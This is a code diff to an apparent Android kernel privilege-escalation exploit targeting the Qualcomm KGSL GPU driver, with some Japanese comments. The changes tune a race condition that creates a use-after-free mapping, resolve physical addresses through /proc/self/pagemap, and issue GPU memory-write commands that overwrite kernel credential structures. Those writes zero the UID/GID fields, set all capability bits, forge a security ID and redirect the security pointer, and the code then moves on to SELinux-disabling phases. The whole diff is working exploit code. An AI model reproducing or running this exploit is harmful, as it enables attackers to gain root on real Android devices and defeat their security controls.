@@ -237,10 +237,13 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
 
 static void *race_thread(void *arg) {
     (void)arg;
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    // 競合を起こしやすくするため、UAF_ADDR 付近のアドレスを import 対象に変更
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = UAF_ADDR + 0x1000 };
     struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
+        .priv = (uint64_t)&uaddr,
+        .priv_len = 0x10000, // サイズを小さくする
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
+        .type = KGSL_USER_MEM_TYPE_ADDR,
     };
     while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
     return NULL;
@@ -345,6 +348,7 @@ int main(int argc, char **argv) {
     if (uaf_m == MAP_FAILED) die("mmap UAF");
     munmap(uaf_m, UAF_SIZE);
 
+    // BOGUS_ADDR は依然として必要（マッピングのヒントとして）
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
@@ -357,7 +361,7 @@ int main(int argc, char **argv) {
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 
-    printf("[*] Phase 2: Race\n");
+    printf("[*] Phase 2: Race (without MAP_FIXED)\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
 
     pthread_t thr;
@@ -365,45 +369,52 @@ int main(int argc, char **argv) {
 
     void *overlap_map = MAP_FAILED;
     int hit = 0;
-    for (int i = 0; i < 20000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
-        int e = errno;
-        if (r != MAP_FAILED) {
+    const int MAX_LOOP = 50000000;
+    for (int i = 0; i < MAX_LOOP; i++) {
+        void *r = mmap(NULL, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_SHARED, kgsl_fd, (off_t)ov_id << 12);
+        if (r == MAP_FAILED) {
+            if (i % 5000000 == 0) printf("  race %d/%d errno=%d\n", i, MAX_LOOP, errno);
+            usleep(1);
+            continue;
+        }
+        if ((uintptr_t)r >= UAF_ADDR && (uintptr_t)r + OVERLAP_SIZE <= UAF_ADDR + UAF_SIZE) {
             overlap_map = r;
             hit = 1;
+            printf("[+] Race won! overlap mapped at 0x%lx\n", (unsigned long)r);
             break;
+        } else {
+            munmap(r, OVERLAP_SIZE);
+            if (i % 5000000 == 0) printf("  race %d: mapping at 0x%lx not in UAF\n", i, (unsigned long)r);
         }
-        if (i % 2000000 == 0) printf("  race %d/%d errno=%d\n", i, 20000000, e);
+        usleep(1);
     }
 
     race_done = 1;
     pthread_join(thr, NULL);
 
     if (!hit || overlap_map == MAP_FAILED) {
-        printf("[-] Race failed: no valid overlap mapping\n");
+        printf("[-] Race failed: no overlap mapping in UAF region\n");
         close(kgsl_fd);
         return 1;
     }
-    printf("[+] Race won! overlap mapped at 0x%lx\n", (unsigned long)overlap_map);
 
-    // Get physical address of OVERLAP_ADDR via pagemap
+    // 物理アドレスを取得 (overlap_map がマップされている)
     int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
     if (pagemap_fd < 0) die("open pagemap");
     uint64_t pagemap_entry;
-    off_t off = (OVERLAP_ADDR / 0x1000) * 8;
+    off_t off = ((uintptr_t)overlap_map / 0x1000) * 8;
     if (lseek(pagemap_fd, off, SEEK_SET) != off || read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) != sizeof(pagemap_entry)) {
-        die("read pagemap for OVERLAP_ADDR");
+        die("read pagemap for overlap_map");
     }
     if (!(pagemap_entry & 0x8000000000000000ULL)) {
-        printf("[-] OVERLAP_ADDR not present in pagemap\n");
+        printf("[-] overlap_map not present in pagemap\n");
         return 1;
     }
     uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
     uint64_t overlap_base_pa = pfn << 12;
     close(pagemap_fd);
-    printf("[*] OVERLAP base physical address = 0x%lx\n", (unsigned long)overlap_base_pa);
+    printf("[*] overlap base physical address = 0x%lx\n", (unsigned long)overlap_base_pa);
 
     printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(kgsl_fd, uaf_id);
@@ -496,7 +507,6 @@ int main(int argc, char **argv) {
     int dw;
     unsigned int ts;
 
-    // PAGE_OFFSET for arm64 39-bit VA (typical)
     uint64_t page_offset = 0xFFFFFF8000000000ULL;
     printf("[*] Using PAGE_OFFSET = 0x%lx\n", (unsigned long)page_offset);
 
@@ -535,8 +545,7 @@ int main(int argc, char **argv) {
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
 
-            // Compute physical address of this cred page
-            uint64_t pa_cred = overlap_base_pa + (va - OVERLAP_ADDR);
+            uint64_t pa_cred = overlap_base_pa + (va - (uint64_t)overlap_map);
             uint64_t kva_cred = page_offset + pa_cred;
             fake_sec_addrs[n_cred] = kva_cred + 0xFB0;
             printf("  fake_sec_addr = 0x%lx\n", (unsigned long)fake_sec_addrs[n_cred]);
@@ -566,7 +575,7 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    // Write fake SID=1 into the pages using GPU (since we have GPU write capability)
+    // Write fake SID=1 into the pages using GPU
     for (int p = 0; p < n_cred; p++) {
         uint64_t fake_sid_addr = cred_pages[p] + 0xFB0;
         memset(ib_m, 0, 0x10000);
@@ -577,7 +586,7 @@ int main(int argc, char **argv) {
         split64(fake_sid_addr, &al, &ah);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
         cmd[dw++] = al; cmd[dw++] = ah;
-        cmd[dw++] = 1; // SID_KERNEL = 1
+        cmd[dw++] = 1;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
@@ -592,7 +601,6 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
 
-        // UID/GID fields (offset 0x04)
         uint64_t uid_base = cbase + 0x04;
         for (int i = 0; i < 8; i++) {
             uint32_t al, ah;
@@ -602,7 +610,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0;
         }
 
-        // Capabilities (offset 0x28)
         uint64_t cap_base = cbase + 0x28;
         for (int i = 0; i < 4; i++) {
             uint32_t al, ah;
@@ -612,7 +619,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
 
-        // Overwrite cred->security pointer
         if (sec_offset >= 0 && fake_sec_addrs[p] != 0) {
             uint64_t sec_addr_base = cbase + sec_offset;
             uint32_t al, ah;
@@ -632,7 +638,7 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite and security pointer redirection done\n");
 
-    // The rest (Phase 9, 9b, 10, 11) remains unchanged (fallback attempts)
+    // Phase 9, 9b, 10, 11 are unchanged (fallback attempts)
     printf("[*] Phase 9: Aggressive SELinux disabling (fallback)\n");
 
     memset(ib_m, 0, 0x10000);
